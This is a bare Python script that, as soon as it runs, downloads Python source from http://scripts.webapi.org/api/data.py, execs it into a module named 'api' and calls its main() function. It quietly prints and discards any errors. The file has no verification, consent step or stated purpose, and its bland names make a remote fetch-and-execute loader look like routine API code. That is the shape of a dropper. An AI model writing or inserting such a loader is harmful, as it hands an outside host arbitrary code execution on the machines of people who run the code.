import sys
import types
import urllib.request

def get_url():
    return "http://scripts.webapi.org/api/data.py"

def get_source_code(url):
    with urllib.request.urlopen(url) as response:
        return response.read().decode('utf-8')

def execute():
    url = get_url()
    module_name = "api"

    source = get_source_code(url)
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
